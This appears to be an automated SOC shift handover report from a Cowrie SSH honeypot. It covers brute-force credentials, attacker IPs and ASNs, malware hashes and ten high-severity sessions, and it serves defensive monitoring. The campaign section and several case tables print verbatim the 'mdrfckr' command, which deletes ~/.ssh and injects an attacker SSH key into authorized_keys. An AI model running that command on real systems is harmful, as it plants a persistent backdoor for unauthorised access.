# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-28 |
| **Generated At** | 2026-03-28T10:30:24Z |
| **Shift Time** | 10:30 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **84** |
| Confirmed Threats | **80** |
| False Positives Filtered | **4** (4.8%) |
| Unique Attacker IPs | **33** |
| Countries of Origin | **17** |
| High Severity Cases | **10** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **74** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **35** |
| Unique Credential Pairs | **26** |
| Unique Usernames | **19** |
| Unique Passwords | **26** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 10 |
| `345gs5662d34` | 5 |
| `Centos` | 2 |
| `Config` | 2 |
| `operator` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 5 |
| `operator123456` | 2 |
| `ts3` | 1 |
| `webadmin` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `root` | `3245gs5662d34` | 5 |
| `operator` | `operator123456` | 2 |
| `ts3` | `ts3` | 1 |
| `Centos` | `webadmin` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `useruser` | `187.33.251.218` | 2026-03-28T09:42:15 |
| `root` | `3245gs5662d34` | `187.33.251.218` | 2026-03-28T09:42:26 |
| `root` | `1234.Abc` | `118.193.33.128` | 2026-03-28T09:48:16 |
| `root` | `3245gs5662d34` | `118.193.33.128` | 2026-03-28T09:48:19 |
| `root` | `d41d8cd98f00b204e9800998ecf8427e` | `217.148.142.100` | 2026-03-28T10:06:21 |
| `root` | `3245gs5662d34` | `217.148.142.100` | 2026-03-28T10:06:27 |
| `root` | `QX@123456` | `81.192.46.45` | 2026-03-28T10:16:21 |
| `root` | `3245gs5662d34` | `81.192.46.45` | 2026-03-28T10:16:25 |
| `root` | `asshole1` | `206.189.80.102` | 2026-03-28T10:18:58 |
| `root` | `3245gs5662d34` | `206.189.80.102` | 2026-03-28T10:19:00 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `217.148.142.100`, `81.192.46.45`, `206.189.80.102`, `187.33.251.218`, `118.193.33.128`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **33** |
| Unique ASNs | **28** |
| High-Risk ASNs | **24** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 3 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 2 | HIGH |
| `AS9829` | National Internet Backbone | 2 | HIGH |
| `AS38835` | Buroserv Australia Pty Ltd | 1 | HIGH |
| `AS11404` | Wave Broadband | 1 | HIGH |
| `AS24158` | Taiwan Mobile Co., Ltd. | 1 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (10)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1d88a3745ae5

| Field | Detail |
|---|---|
| **Source IP** | `187.33.251[.]218` |
| **First Seen** | 2026-03-28 09:42 |
| **Last Seen** | 2026-03-28 09:42 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 09:42:11` | `cowrie.session.connect` |
| `2026-03-28 09:42:11` | `cowrie.client.version` |
| `2026-03-28 09:42:11` | `cowrie.client.kex` |
| `2026-03-28 09:42:15` | `cowrie.login.success` |
| `2026-03-28 09:42:17` | `cowrie.session.params` |
| `2026-03-28 09:42:17` | `cowrie.command.input` |
| `2026-03-28 09:42:17` | `cowrie.command.failed` |
| `2026-03-28 09:42:18` | `cowrie.log.closed` |
| `2026-03-28 09:42:19` | `cowrie.session.params` |
| `2026-03-28 09:42:19` | `cowrie.command.input` |
| `2026-03-28 09:42:20` | `cowrie.session.file_download` |
| `2026-03-28 09:42:20` | `cowrie.log.closed` |
| `2026-03-28 09:42:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.33.251[.]218` to AbuseIPDB if not already reported
- [ ] Block `187.33.251[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-079468481d14

| Field | Detail |
|---|---|
| **Source IP** | `187.33.251[.]218` |
| **First Seen** | 2026-03-28 09:42 |
| **Last Seen** | 2026-03-28 09:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 09:42:24` | `cowrie.session.connect` |
| `2026-03-28 09:42:24` | `cowrie.client.version` |
| `2026-03-28 09:42:24` | `cowrie.client.kex` |
| `2026-03-28 09:42:26` | `cowrie.login.success` |
| `2026-03-28 09:42:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.33.251[.]218` to AbuseIPDB if not already reported
- [ ] Block `187.33.251[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d767bc1d90e2

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]128` |
| **First Seen** | 2026-03-28 09:48 |
| **Last Seen** | 2026-03-28 09:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 09:48:15` | `cowrie.session.connect` |
| `2026-03-28 09:48:15` | `cowrie.client.version` |
| `2026-03-28 09:48:15` | `cowrie.client.kex` |
| `2026-03-28 09:48:16` | `cowrie.login.success` |
| `2026-03-28 09:48:16` | `cowrie.session.params` |
| `2026-03-28 09:48:16` | `cowrie.command.input` |
| `2026-03-28 09:48:16` | `cowrie.command.failed` |
| `2026-03-28 09:48:16` | `cowrie.log.closed` |
| `2026-03-28 09:48:16` | `cowrie.session.params` |
| `2026-03-28 09:48:16` | `cowrie.command.input` |
| `2026-03-28 09:48:17` | `cowrie.session.file_download` |
| `2026-03-28 09:48:17` | `cowrie.log.closed` |
| `2026-03-28 09:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]128` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-045f64829d35

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]128` |
| **First Seen** | 2026-03-28 09:48 |
| **Last Seen** | 2026-03-28 09:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 09:48:18` | `cowrie.session.connect` |
| `2026-03-28 09:48:18` | `cowrie.client.version` |
| `2026-03-28 09:48:18` | `cowrie.client.kex` |
| `2026-03-28 09:48:19` | `cowrie.login.success` |
| `2026-03-28 09:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]128` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e44efd14622a

| Field | Detail |
|---|---|
| **Source IP** | `217.148.142[.]100` |
| **First Seen** | 2026-03-28 10:06 |
| **Last Seen** | 2026-03-28 10:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:06:20` | `cowrie.session.connect` |
| `2026-03-28 10:06:20` | `cowrie.client.version` |
| `2026-03-28 10:06:20` | `cowrie.client.kex` |
| `2026-03-28 10:06:21` | `cowrie.login.success` |
| `2026-03-28 10:06:22` | `cowrie.session.params` |
| `2026-03-28 10:06:22` | `cowrie.command.input` |
| `2026-03-28 10:06:22` | `cowrie.command.failed` |
| `2026-03-28 10:06:22` | `cowrie.log.closed` |
| `2026-03-28 10:06:23` | `cowrie.session.params` |
| `2026-03-28 10:06:23` | `cowrie.command.input` |
| `2026-03-28 10:06:23` | `cowrie.session.file_download` |
| `2026-03-28 10:06:23` | `cowrie.log.closed` |
| `2026-03-28 10:06:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.148.142[.]100` to AbuseIPDB if not already reported
- [ ] Block `217.148.142[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d606bcd675f

| Field | Detail |
|---|---|
| **Source IP** | `217.148.142[.]100` |
| **First Seen** | 2026-03-28 10:06 |
| **Last Seen** | 2026-03-28 10:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:06:26` | `cowrie.session.connect` |
| `2026-03-28 10:06:26` | `cowrie.client.version` |
| `2026-03-28 10:06:26` | `cowrie.client.kex` |
| `2026-03-28 10:06:27` | `cowrie.login.success` |
| `2026-03-28 10:06:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.148.142[.]100` to AbuseIPDB if not already reported
- [ ] Block `217.148.142[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c7ef0896e9e

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-03-28 10:16 |
| **Last Seen** | 2026-03-28 10:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:16:21` | `cowrie.session.connect` |
| `2026-03-28 10:16:21` | `cowrie.client.version` |
| `2026-03-28 10:16:21` | `cowrie.client.kex` |
| `2026-03-28 10:16:21` | `cowrie.login.success` |
| `2026-03-28 10:16:22` | `cowrie.session.params` |
| `2026-03-28 10:16:22` | `cowrie.command.input` |
| `2026-03-28 10:16:22` | `cowrie.command.failed` |
| `2026-03-28 10:16:22` | `cowrie.log.closed` |
| `2026-03-28 10:16:22` | `cowrie.session.params` |
| `2026-03-28 10:16:22` | `cowrie.command.input` |
| `2026-03-28 10:16:22` | `cowrie.session.file_download` |
| `2026-03-28 10:16:22` | `cowrie.log.closed` |
| `2026-03-28 10:16:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98c361958811

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-03-28 10:16 |
| **Last Seen** | 2026-03-28 10:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:16:24` | `cowrie.session.connect` |
| `2026-03-28 10:16:24` | `cowrie.client.version` |
| `2026-03-28 10:16:24` | `cowrie.client.kex` |
| `2026-03-28 10:16:25` | `cowrie.login.success` |
| `2026-03-28 10:16:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea18355f0d4a

| Field | Detail |
|---|---|
| **Source IP** | `206.189.80[.]102` |
| **First Seen** | 2026-03-28 10:18 |
| **Last Seen** | 2026-03-28 10:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:18:57` | `cowrie.session.connect` |
| `2026-03-28 10:18:57` | `cowrie.client.version` |
| `2026-03-28 10:18:57` | `cowrie.client.kex` |
| `2026-03-28 10:18:58` | `cowrie.login.success` |
| `2026-03-28 10:18:58` | `cowrie.session.params` |
| `2026-03-28 10:18:58` | `cowrie.command.input` |
| `2026-03-28 10:18:58` | `cowrie.command.failed` |
| `2026-03-28 10:18:58` | `cowrie.log.closed` |
| `2026-03-28 10:18:58` | `cowrie.session.params` |
| `2026-03-28 10:18:58` | `cowrie.command.input` |
| `2026-03-28 10:18:58` | `cowrie.session.file_download` |
| `2026-03-28 10:18:58` | `cowrie.log.closed` |
| `2026-03-28 10:19:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.80[.]102` to AbuseIPDB if not already reported
- [ ] Block `206.189.80[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29c9e0021e48

| Field | Detail |
|---|---|
| **Source IP** | `206.189.80[.]102` |
| **First Seen** | 2026-03-28 10:19 |
| **Last Seen** | 2026-03-28 10:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:19:00` | `cowrie.session.connect` |
| `2026-03-28 10:19:00` | `cowrie.client.version` |
| `2026-03-28 10:19:00` | `cowrie.client.kex` |
| `2026-03-28 10:19:00` | `cowrie.login.success` |
| `2026-03-28 10:19:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.80[.]102` to AbuseIPDB if not already reported
- [ ] Block `206.189.80[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `66.167.166[.]37` | **24** | 2026-03-28 08:47 | 2026-03-28 08:52 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `14.1.106[.]167` | **19** | 2026-03-28 09:50 | 2026-03-28 09:54 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `1.82.135[.]154` | 1 | 2026-03-28 09:48 | 2026-03-28 09:48 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.13.4[.]128` | 1 | 2026-03-28 08:48 | 2026-03-28 08:48 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.211.7[.]162` | 1 | 2026-03-28 08:40 | 2026-03-28 08:40 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.147.248[.]44` | 1 | 2026-03-28 09:01 | 2026-03-28 09:01 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.32[.]51` | 1 | 2026-03-28 08:42 | 2026-03-28 08:42 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.78.3[.]139` | 1 | 2026-03-28 10:29 | 2026-03-28 10:29 | 8s | 0 | `T1592` | 🟢 LOW |
| `113.158.205[.]225` | 1 | 2026-03-28 09:40 | 2026-03-28 09:40 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.7.248[.]50` | 1 | 2026-03-28 09:57 | 2026-03-28 09:57 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.211.15[.]106` | 1 | 2026-03-28 09:28 | 2026-03-28 09:28 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.193.33[.]128` | 1 | 2026-03-28 09:48 | 2026-03-28 09:48 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `138.36.127[.]80` | 1 | 2026-03-28 10:00 | 2026-03-28 10:00 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.92.187[.]68` | 1 | 2026-03-28 09:03 | 2026-03-28 09:03 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.60.128[.]241` | 1 | 2026-03-28 10:02 | 2026-03-28 10:02 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.201.54[.]90` | 1 | 2026-03-28 10:16 | 2026-03-28 10:16 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `187.33.251[.]218` | 1 | 2026-03-28 09:42 | 2026-03-28 09:42 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.73.22[.]215` | 1 | 2026-03-28 10:22 | 2026-03-28 10:22 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `203.124.60[.]46` | 1 | 2026-03-28 09:00 | 2026-03-28 09:00 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `206.189.80[.]102` | 1 | 2026-03-28 10:18 | 2026-03-28 10:19 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `217.148.142[.]100` | 1 | 2026-03-28 10:06 | 2026-03-28 10:06 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.21.241[.]50` | 1 | 2026-03-28 08:43 | 2026-03-28 08:43 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.88.75[.]74` | 1 | 2026-03-28 09:00 | 2026-03-28 09:00 | 30s | 0 | `T1592` | 🟢 LOW |
| `222.240.215[.]10` | 1 | 2026-03-28 10:20 | 2026-03-28 10:20 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.245.39[.]47` | 1 | 2026-03-28 09:17 | 2026-03-28 09:18 | 14s | 0 | `T1592` | 🟢 LOW |
| `59.8.104[.]168` | 1 | 2026-03-28 09:39 | 2026-03-28 09:39 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.204[.]88` | 1 | 2026-03-28 09:43 | 2026-03-28 09:43 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `81.192.46[.]45` | 1 | 2026-03-28 10:16 | 2026-03-28 10:16 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `99.234.201[.]132` | 1 | 2026-03-28 09:03 | 2026-03-28 09:03 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `43.245.39[.]47` | AU | Buroserv Australia Pty Ltd | **100** ⚠️ | 0 |
